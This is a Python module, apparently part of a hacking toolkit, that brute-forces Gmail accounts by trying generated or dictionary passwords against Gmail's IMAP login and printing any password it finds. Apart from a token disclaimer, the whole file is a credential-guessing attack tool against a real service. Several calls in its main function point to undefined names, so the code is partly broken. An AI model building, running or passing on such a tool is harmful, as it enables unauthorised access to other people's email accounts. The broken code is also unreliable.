"""
Gmail Module
--------------

This Module Is Created To Brute Force Gmail Accounts

You are not permitted to use this module except if you
lose your gmail account password.

Its not very accurate but it do its job.

How To Use:

Run the module as the following

>>> python gmail.py username=USERNAME alphabets=[ALPHABETS] begin=[BEGIN] until=[UNTIL] output=[OUTPUT]

Every parameter in square brackets '[PARAMETER]' are optional
the only required parameter is USERNAME

"""
__version__ = '0.01'
__author__ = 'Youssef Hesham'

import itertools
import imaplib
import weely
from parser import Parser
from helpdoc import goodbye
from helpdoc import gmail_usage

def _check_s(i, e, p) -> str:
    """
    IF the password is valid return the password, else return None
    """
    try:
        i.login(e, p)
    except:
        return None
    else:
        return p

def _check_b(i, e, p) -> bool:
    """
    IF the password is valid return True else return False
    """
    try:
        i.login(e, p)
    except:
        return False
    else:
        print(f"Password Found {e}:{p}")
        return True

def check_gmail_bf(uemail, pwd,
                   start, wwa) -> bool:
    """
    check_gmail_bf
    check gmail account by bruteforce attack
    -------------

    Parameters:
        start: received by bruteforce function in weely module
        wwa: received by bruteforce function in weely module
        uemail: user email
        pwd: user password

    Job:
        checks if the email and password are valid

    Return Value:
        return bool, True if valid else False

    """
    i = imaplib.IMAP4_SSL('imap.gmail.com')

    if _check_b(i, str(uemail), str(pwd)):
        gmail_goodbye(start, wwa)


def check_gmail_dt(uemail, pwdlist) -> str:
    """
    check_gmail_dt
    check gmail account by dictionary attack
    ------------------

    Parameters:
        uemail: user email address
        pwdlist: password list (expected in list)

    Job:
        check if the email and password are valid

    Return Value:
        return str, email password

    Additional Notes:
        you can use this function as the following

        >>> pwdlist = open('passwords.txt', 'r')
        >>> check_gmail_dt('myemail@example.com', pwdlist.readlines())

        you can run it as a script
        `python gmail.py email=USERNAME pwdlist=PWDLIST`
    """
    i = imaplib.IMAP4_SSL('imap.gmail.com')
    for pwd in pwdlist:
        if _check_s(i, uemail, pwd) != None:
            return str(_check_s(i, uemail, pwd))

def main() -> None:
    """
    Main Function
    --------------

    It will use the bruteforce function in
    weely module
    """

# TODO: fix this shit

    parser = Parser('gmail') # initialize arguments
    if parser.get_email() == None:
        gmail_usage()

    if parser.get_pwdlist() == None:
        bruteforce(parser.get_alphabets(),
                   parser.get_output(),
                   parser.get_begin(),
                   parser.get_until(),

                   api=True,
                   func=check_gmail,
                   func_farg=parser.get_email())



if __name__ == '__main__':
    main()
